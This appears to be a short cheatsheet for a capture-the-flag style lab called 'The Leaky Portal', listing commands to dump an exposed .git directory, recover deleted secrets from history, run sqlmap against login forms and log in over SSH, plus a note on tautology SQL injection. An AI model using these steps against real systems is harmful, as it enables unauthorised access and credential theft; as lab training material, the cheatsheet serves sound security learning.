# Cheatsheet — The Leaky Portal

## Targets

- **portal01** — php/sqlite portal + a metadata directory that shouldn't ship

## Useful commands

```bash
curl -sI http://<ip>/.git/HEAD                    # leaked? status 200
git-dumper http://<ip>/.git/ ~/<dump>             # reconstruct the repo
cd ~/<dump> && git log -p                         # history = deleted secrets
git show <commit>:<file>                          # read a scrubbed file

sqlmap -u 'http://<ip>/' --forms --batch          # let the tool find the bypass
curl -s -c c.txt -d 'username=<u>&password=<p>' http://<ip>/
ssh <user>@<ip>
```

## Concepts

- Source disclosure is a *first-order* vuln — secrets in history stay secret
  to no one
- Tautology injection (`' OR …`) makes `AND password='x'` irrelevant
- Recon before exploitation: the fastest win isn't always on the form you see
